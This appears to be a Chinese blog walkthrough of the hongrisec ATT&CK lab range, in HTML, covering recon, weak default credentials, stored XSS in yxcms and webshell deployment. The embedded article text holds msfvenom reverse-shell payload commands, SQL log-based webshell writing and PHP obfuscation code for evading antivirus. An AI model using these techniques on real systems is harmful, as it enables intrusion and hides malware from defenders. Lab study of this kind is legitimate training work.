@@ -1,0 +1,391 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>ATT&CK实战一 | 0opsdc</title>
+<meta name=keywords content="Daily">
+<meta name=description content="一、环境搭建 1.1 下载虚拟机文件 自行搜索。
+1.2 环境介绍 开机密码：hongrisec@2019.
+本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
+Kali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 <ip>即可。
+Win7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
+Win2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。
+Win2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。
+拓扑图如下：
+![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)
+安装完成之后在Win7主机上打开phpstudy开启Web服务。
+二、信息收集 2.1 探测存活主机 命令：
+nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确)结果：
+Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.">
+<meta name=author content="0opsdc">
+<link rel=canonical href=https://examplesite.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="ATT&CK实战一">
+<meta property="og:description" content="一、环境搭建 1.1 下载虚拟机文件 自行搜索。
+1.2 环境介绍 开机密码：hongrisec@2019.
+本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
+Kali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 <ip>即可。
+Win7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
+Win2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。
+Win2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。
+拓扑图如下：
+![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)
+安装完成之后在Win7主机上打开phpstudy开启Web服务。
+二、信息收集 2.1 探测存活主机 命令：
+nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确)结果：
+Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://examplesite.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/"><meta property="og:image" content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2021-07-21T14:34:21+08:00">
+<meta property="article:modified_time" content="2021-07-21T14:34:21+08:00"><meta property="og:site_name" content="0opsdc">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="ATT&CK实战一">
+<meta name=twitter:description content="一、环境搭建 1.1 下载虚拟机文件 自行搜索。
+1.2 环境介绍 开机密码：hongrisec@2019.
+本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。
+Kali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 <ip>即可。
+Win7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。
+Win2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。
+Win2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。
+拓扑图如下：
+![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)
+安装完成之后在Win7主机上打开phpstudy开启Web服务。
+二、信息收集 2.1 探测存活主机 命令：
+nmap -sS -sV -O 192.168.106.0/24# 此处的IP为NAT模式下Win7和Kali自动获取到的IP# 参数说明sS	:	SYN半连接扫描，只进行前两次握手sV	:	显示服务器详细版本O	:	显示服务器操作系统(不太准确)结果：
+Nmap scan report for 192.168.106.150Host is up (0.00044s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/post/"},{"@type":"ListItem","position":2,"name":"ATT\u0026CK实战一","item":"https://examplesite.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ATT\u0026CK实战一","name":"ATT\u0026CK实战一","description":"一、环境搭建 1.1 下载虚拟机文件 自行搜索。\n1.2 环境介绍 开机密码：hongrisec@2019.\n本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。\nKali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 \u0026lt;ip\u0026gt;即可。\nWin7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。\nWin2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。\nWin2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。\n拓扑图如下：\n![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)\n安装完成之后在Win7主机上打开phpstudy开启Web服务。\n二、信息收集 2.1 探测存活主机 命令：\nnmap -sS -sV -O 192.168.106.0/24\r# 此处的IP为NAT模式下Win7和Kali自动获取到的IP\r# 参数说明\rsS\t:\tSYN半连接扫描，只进行前两次握手\rsV\t:\t显示服务器详细版本\rO\t:\t显示服务器操作系统(不太准确)\r结果：\nNmap scan report for 192.168.106.150\rHost is up (0.00044s latency).\rNot shown: 998 filtered ports\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.","keywords":["Daily"],"articleBody":"一、环境搭建 1.1 下载虚拟机文件 自行搜索。\n1.2 环境介绍 开机密码：hongrisec@2019.\n本次实验共3台主机，Win7作为Web服务器，是最先攻击点，Win2k3为内网域成员主机，Win2k8 R2为内网域控主机。\nKali：自主搭建，配置与Web服务器同一网段的IP，使用命令ifconfig eth0 即可。\nWin7：双网卡，即存在内外网IP。外网网卡通过DHCP自动获取IP，内网网卡配置静态IP:192.168.52.143。服务器存在yxcms。分别与Kali(NAT模式)和内网两台主机(自定义VMnet2)连通。\nWin2k3：只有内网网卡，IP:192.168.52.138，使用VMnet2。\nWin2k8 R2：只有内网网卡，IP:192.168.52.141，使用VMnet2。\n拓扑图如下：\n![Untitled Diagram](https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled Diagram.png)\n安装完成之后在Win7主机上打开phpstudy开启Web服务。\n二、信息收集 2.1 探测存活主机 命令：\nnmap -sS -sV -O 192.168.106.0/24\r# 此处的IP为NAT模式下Win7和Kali自动获取到的IP\r# 参数说明\rsS\t:\tSYN半连接扫描，只进行前两次握手\rsV\t:\t显示服务器详细版本\rO\t:\t显示服务器操作系统(不太准确)\r结果：\nNmap scan report for 192.168.106.150\rHost is up (0.00044s latency).\rNot shown: 998 filtered ports\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)\r3306/tcp open mysql MySQL (unauthorized)\rMAC Address: 00:0C:29:33:16:84 (VMware)\rWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\rDevice type: general purpose\rRunning: Microsoft Windows 2008|7|8.1|Vista\rOS CPE: cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1\rOS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008\rNetwork Distance: 1 hop\r2.2 访问Web服务 尝试访问主机80端口，发现为php探针页面。获得操作系统、编译引擎、主机名、绝对路径、管理员邮箱等信息。可考虑通过钓鱼攻击等方式进一步获取信息。\n继续向下翻，有数据库检测和函数检测功能:\n尝试数据库弱口令，账密为root/root。\n2.3 目录探测 使用dirbuster或御剑等工具扫描目录，发现/phpmyadmin/登录目录和beifen.rar网站源代码。\n访问192.168.106.150/phpmyadmin使用默认账密root/root登录phpmyadmin后台管理页面。\n查看下载下来的网站源代码，发现网站使用了yxcms，访问192.168.106.150/yxcms，发现是一个默认的演示站点，继续访问192.168.106.150/yxcms/robots.txt，内容如下：\n#\r# robots.txt for YXCMS\r#\rUser-agent: * Disallow: /data\rDisallow: /protected\r访问192.168.106.150/yxcms/data，发现一个目录索引：\n访问192.168.106.150/yxcms/protected：\n三、漏洞利用 3.1 漏洞探寻与利用 3.1.1 yxcms信息泄露+弱口令 查看主页面的公共信息栏，有默认账密：\nURL与默认账密均未修改，直接登录管理员后台。\n3.1.2 phpmyadmin弱口令 在目录探测部分中已介绍。\n3.1.3 yxcms留言板xss漏洞 进入留言板模块，构造如下内容：\n登录后台管理页面→结构管理→留言本→审核刚刚提交的评论，刷新留言板页面，成功触发XSS，管理访问审核页面以及其他用户访问留言板时都会触发弹窗，为存储型XSS漏洞。\n3.1.4 yxcms后台任意文件读写漏洞 进入后台管理页面→管理首页→前台模板→管理模板文件→新建，写入一句话木马：\n创建之后，根据之前的目录索引或网站源码查找文件存储路径：http://192.168.106.150/yxcms/protected/apps/default/view/default/，使用蚁剑连接小马：\nShell url\t:\thttp://192.168.106.150/yxcms/protected/apps/default/view/default/oopsdc.php\rShell pwd\t:\tcmd\r成功连接。\n3.1.5 yxcms后台SQL注入漏洞 进入后台管理页面→结构管理→碎片列表→删除，在点击删除之前使用bp抓包，正常删除已存在的碎片会有回显结果，删除不存在的碎片则无回显，判断存在SQL盲注。对于无回显的情况，可通过使用CEYECEYE平台的使用 - 时光不改 - 博客园 (cnblogs.com)及类似工具查看回显。\n3.1.6 SQL语句文件写入 在phpmyadmin页面通过SQL查询语句outfile写入一句话木马：\nselect '' into outfile 'C:/phpStudy/WWW/1.php' 查看secure-file-priv变量配置：\nshow global variable like '%secure%'; 变量值为NULL不可读写，且变量只读不可编辑。\n3.1.7 开启全局日志getshell 使用以下语句查询全局日志变量配置：\nshow variables like '%general%'; 开启general_log将所有查询语句记录到新指定的可访问文件中：\nset global general_log = on; set global general_log_file = 'C:/phpStudy/www/2.php'; 写入一句话木马：\nselect '' 蚁剑连接即可。\n3.2 后台getshell技巧 3.2.1 上传大马 上传大马获得命令执行环境。\n3.2.2 msf监听反弹shell 进入msf：\nmsfconsole\r使用msfvenom生成payload文件，使用蚁剑上传至WWW目录：\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.106.138 -f raw  test.php # 参数解释 p\t:\t添加载荷(payload) f\t:\t输出文件格式，文件会在当前目录生成 接下来使用handler模块接收反弹模块，在8888端口进行监听，访问test.php，连接成功：\nuse exploit/multi/handler\rrun\r还可利用应用系统漏洞，如永恒之蓝等。\n3.2.3 免杀payload 在目标主机存在杀软的情况下，上传payload后会被检测并清除，因此需要对payload进行免杀操作。使用msfvenom生成payload，此处采用shellcode方式借助第三方直接加载到内存中，如：\nmsfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\\x00' LHOST= LPORT= -f c # 参数解释 e\t:\t选择指定编码器 i\t:\t编码次数 b\t:\t去除多余/坏掉字符 f\t:\t输出文件格式，此处使用C编译器编写代码 相关文章：\nPayload 实现分离免杀 - lyshark - 博客园 (cnblogs.com)\n还可通过多层编码对大马原文件进行编码，对关键字进行拆解免杀，脚本：\n$src = file_get_contents('C:\\phpStudy\\WWW\\dama.txt');\t# 大马源码路径 $enc = base64_encode(gzdeflate($code));\t# 加密函数，可自行修改 echo $enc\t# 输出编码后的代码 使用编码后的代码：\nphp eval(gzdeflate(base64_decode(''))); ?关键字免杀：\nphp $o = 'BasE6'; $p = '4_'; $s = 'dE'; $d = 'Co'; $c = 'De'; $opsdc = $o.$p.$s$.d.$c; $a = \"opsdc\"; $res = $$a('源码Base64编码') eval($res); ?$res = strrev('EdoCeD_46EsAb'); $b = $res('源码Base64编码'); eval($b); ?  本文链接：ATT\u0026CK实战一 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"394","inLanguage":"en","datePublished":"2021-07-21T14:34:21+08:00","dateModified":"2021-07-21T14:34:21+08:00","author":{"@type":"Person","name":"0opsdc"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://examplesite.com/post/attck%E5%AE%9E%E6%88%98%E4%B8%80/"},"publisher":{"@type":"Organization","name":"0opsdc","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+</head>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://examplesite.com/ accesskey=h title="Home (Alt + H)">Home</a>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://examplesite.com/archives/ title=Archives>
+<span>Archives</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+<li>
+<a href=https://examplesite.com/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://examplesite.com/>Home</a>&nbsp;»&nbsp;<a href=https://examplesite.com/post/>Posts</a></div>
+<h1 class=post-title>
+ATT&CK实战一
+</h1>
+<div class=post-meta>July 21, 2021&nbsp;·&nbsp;0opsdc
+</div>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#%e4%b8%80%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba aria-label=一、环境搭建>一、环境搭建</a><ul>
+<li>
+<a href=#11-%e4%b8%8b%e8%bd%bd%e8%99%9a%e6%8b%9f%e6%9c%ba%e6%96%87%e4%bb%b6 aria-label="1.1 下载虚拟机文件">1.1 下载虚拟机文件</a></li>
+<li>
+<a href=#12-%e7%8e%af%e5%a2%83%e4%bb%8b%e7%bb%8d aria-label="1.2 环境介绍">1.2 环境介绍</a></li></ul>
+</li>
+<li>
+<a href=#%e4%ba%8c%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86 aria-label=二、信息收集>二、信息收集</a><ul>
+<li>
+<a href=#21-%e6%8e%a2%e6%b5%8b%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%ba aria-label="2.1 探测存活主机">2.1 探测存活主机</a></li>
+<li>
+<a href=#22-%e8%ae%bf%e9%97%aeweb%e6%9c%8d%e5%8a%a1 aria-label="2.2 访问Web服务">2.2 访问Web服务</a></li>
+<li>
+<a href=#23-%e7%9b%ae%e5%bd%95%e6%8e%a2%e6%b5%8b aria-label="2.3 目录探测">2.3 目录探测</a></li></ul>
+</li>
+<li>
+<a href=#%e4%b8%89%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8 aria-label=三、漏洞利用>三、漏洞利用</a><ul>
+<li>
+<a href=#31-%e6%bc%8f%e6%b4%9e%e6%8e%a2%e5%af%bb%e4%b8%8e%e5%88%a9%e7%94%a8 aria-label="3.1 漏洞探寻与利用">3.1 漏洞探寻与利用</a><ul>
+<li>
+<a href=#311-yxcms%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2%e5%bc%b1%e5%8f%a3%e4%bb%a4 aria-label="3.1.1 yxcms信息泄露+弱口令">3.1.1 yxcms信息泄露+弱口令</a></li>
+<li>
+<a href=#312-phpmyadmin%e5%bc%b1%e5%8f%a3%e4%bb%a4 aria-label="3.1.2 phpmyadmin弱口令">3.1.2 phpmyadmin弱口令</a></li>
+<li>
+<a href=#313-yxcms%e7%95%99%e8%a8%80%e6%9d%bfxss%e6%bc%8f%e6%b4%9e aria-label="3.1.3 yxcms留言板xss漏洞">3.1.3 yxcms留言板xss漏洞</a></li>
+<li>
+<a href=#314-yxcms%e5%90%8e%e5%8f%b0%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e8%af%bb%e5%86%99%e6%bc%8f%e6%b4%9e aria-label="3.1.4 yxcms后台任意文件读写漏洞">3.1.4 yxcms后台任意文件读写漏洞</a></li>
+<li>
+<a href=#315-yxcms%e5%90%8e%e5%8f%b0sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e aria-label="3.1.5 yxcms后台SQL注入漏洞">3.1.5 yxcms后台SQL注入漏洞</a></li>
+<li>
+<a href=#316-sql%e8%af%ad%e5%8f%a5%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5 aria-label="3.1.6 SQL语句文件写入">3.1.6 SQL语句文件写入</a></li>
+<li>
+<a href=#317-%e5%bc%80%e5%90%af%e5%85%a8%e5%b1%80%e6%97%a5%e5%bf%97getshell aria-label="3.1.7 开启全局日志getshell">3.1.7 开启全局日志getshell</a></li></ul>
+</li>
+<li>
+<a href=#32-%e5%90%8e%e5%8f%b0getshell%e6%8a%80%e5%b7%a7 aria-label="3.2 后台getshell技巧">3.2 后台getshell技巧</a><ul>
+<li>
+<a href=#321-%e4%b8%8a%e4%bc%a0%e5%a4%a7%e9%a9%ac aria-label="3.2.1 上传大马">3.2.1 上传大马</a></li>
+<li>
+<a href=#322-msf%e7%9b%91%e5%90%ac%e5%8f%8d%e5%bc%b9shell aria-label="3.2.2 msf监听反弹shell">3.2.2 msf监听反弹shell</a></li>
+<li>
+<a href=#323-%e5%85%8d%e6%9d%80payload aria-label="3.2.3 免杀payload">3.2.3 免杀payload</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><h1 id=一环境搭建>一、环境搭建<a hidden class=anchor aria-hidden=true href=#一环境搭建>#</a></h1>
+<h2 id=11-下载虚拟机文件>1.1 下载虚拟机文件<a hidden class=anchor aria-hidden=true href=#11-下载虚拟机文件>#</a></h2>
+<p>自行搜索。</p>
+<h2 id=12-环境介绍>1.2 环境介绍<a hidden class=anchor aria-hidden=true href=#12-环境介绍>#</a></h2>
+<p>开机密码：<code>hongrisec@2019.</code></p>
+<p>本次实验共3台主机，<code>Win7</code>作为<code>Web</code>服务器，是最先攻击点，<code>Win2k3</code>为内网域成员主机，<code>Win2k8 R2</code>为内网域控主机。</p>
+<p><code>Kali</code>：自主搭建，配置与<code>Web</code>服务器同一网段的<code>IP</code>，使用命令<code>ifconfig eth0 &lt;ip></code>即可。</p>
+<p><code>Win7</code>：双网卡，即存在内外网<code>IP</code>。外网网卡通过<code>DHCP</code>自动获取<code>IP</code>，内网网卡配置静态<code>IP</code>:<code>192.168.52.143</code>。服务器存在<code>yxcms</code>。分别与<code>Kali</code>(<code>NAT</code>模式)和内网两台主机(自定义<code>VMnet2</code>)连通。</p>
+<p><code>Win2k3</code>：只有内网网卡，<code>IP</code>:<code>192.168.52.138</code>，使用<code>VMnet2</code>。</p>
+<p><code>Win2k8 R2</code>：只有内网网卡，<code>IP</code>:<code>192.168.52.141</code>，使用<code>VMnet2</code>。</p>
+<p>拓扑图如下：</p>
+<p>![Untitled Diagram](<a href=https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled>https://gitee.com/oopsdc/PicBed/raw/master/img/Untitled</a> Diagram.png)</p>
+<p>安装完成之后在<code>Win7</code>主机上打开<code>phpstudy</code>开启<code>Web</code>服务。</p>
+<h1 id=二信息收集>二、信息收集<a hidden class=anchor aria-hidden=true href=#二信息收集>#</a></h1>
+<h2 id=21-探测存活主机>2.1 探测存活主机<a hidden class=anchor aria-hidden=true href=#21-探测存活主机>#</a></h2>
+<p>命令：</p>
+<pre tabindex=0><code>nmap -sS -sV -O 192.168.106.0/24
+
+# 此处的IP为NAT模式下Win7和Kali自动获取到的IP
+# 参数说明
+sS		:		SYN半连接扫描，只进行前两次握手
+sV		:		显示服务器详细版本
+O		:		显示服务器操作系统(不太准确)
+</code></pre><p>结果：</p>
+<pre tabindex=0><code>Nmap scan report for 192.168.106.150
+Host is up (0.00044s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
+3306/tcp open  mysql   MySQL (unauthorized)
+MAC Address: 00:0C:29:33:16:84 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Microsoft Windows 2008|7|8.1|Vista
+OS CPE: cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
+Network Distance: 1 hop
+</code></pre><h2 id=22-访问web服务>2.2 访问Web服务<a hidden class=anchor aria-hidden=true href=#22-访问web服务>#</a></h2>
+<p>尝试访问主机<code>80</code>端口，发现为<code>php</code>探针页面。获得操作系统、编译引擎、主机名、绝对路径、管理员邮箱等信息。可考虑通过钓鱼攻击等方式进一步获取信息。</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721162159188.png alt=image-20210721162159188>
+</p>
+<p>继续向下翻，有数据库检测和函数检测功能:</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721162226371.png alt=image-20210721162226371>
+</p>
+<p>尝试数据库弱口令，账密为<code>root/root</code>。</p>
+<h2 id=23-目录探测>2.3 目录探测<a hidden class=anchor aria-hidden=true href=#23-目录探测>#</a></h2>
+<p>使用<code>dirbuster</code>或御剑等工具扫描目录，发现<code>/phpmyadmin/</code>登录目录和<code>beifen.rar</code>网站源代码。</p>
+<p>访问<code>192.168.106.150/phpmyadmin</code>使用默认账密<code>root/root</code>登录<code>phpmyadmin</code>后台管理页面。</p>
+<p>查看下载下来的网站源代码，发现网站使用了<code>yxcms</code>，访问<code>192.168.106.150/yxcms</code>，发现是一个默认的演示站点，继续访问<code>192.168.106.150/yxcms/robots.txt</code>，内容如下：</p>
+<pre tabindex=0><code>#
+# robots.txt for YXCMS
+#
+User-agent: * 
+Disallow: /data
+Disallow: /protected
+</code></pre><p>访问<code>192.168.106.150/yxcms/data</code>，发现一个目录索引：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721164446202.png alt=image-20210721164446202>
+</p>
+<p>访问<code>192.168.106.150/yxcms/protected</code>：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721164606055.png alt=image-20210721164606055>
+</p>
+<h1 id=三漏洞利用>三、漏洞利用<a hidden class=anchor aria-hidden=true href=#三漏洞利用>#</a></h1>
+<h2 id=31-漏洞探寻与利用>3.1 漏洞探寻与利用<a hidden class=anchor aria-hidden=true href=#31-漏洞探寻与利用>#</a></h2>
+<h3 id=311-yxcms信息泄露弱口令>3.1.1 yxcms信息泄露+弱口令<a hidden class=anchor aria-hidden=true href=#311-yxcms信息泄露弱口令>#</a></h3>
+<p>查看主页面的<code>公共信息</code>栏，有默认账密：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721165018156.png alt=image-20210721165018156>
+</p>
+<p><code>URL</code>与默认账密均未修改，直接登录管理员后台。</p>
+<h3 id=312-phpmyadmin弱口令>3.1.2 phpmyadmin弱口令<a hidden class=anchor aria-hidden=true href=#312-phpmyadmin弱口令>#</a></h3>
+<p>在<code>目录探测</code>部分中已介绍。</p>
+<h3 id=313-yxcms留言板xss漏洞>3.1.3 yxcms留言板xss漏洞<a hidden class=anchor aria-hidden=true href=#313-yxcms留言板xss漏洞>#</a></h3>
+<p>进入<code>留言板</code>模块，构造如下内容：</p>
+<p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/img/image-20210721165641998.png alt=image-20210721165641998>
+</p>
+<p>登录后台管理页面→结构管理→留言本→审核刚刚提交的评论，刷新留言板页面，成功触发<code>XSS</code>，管理访问审核页面以及其他用户访问留言板时都会触发弹窗，为存储型<code>XSS</code>漏洞。</p>
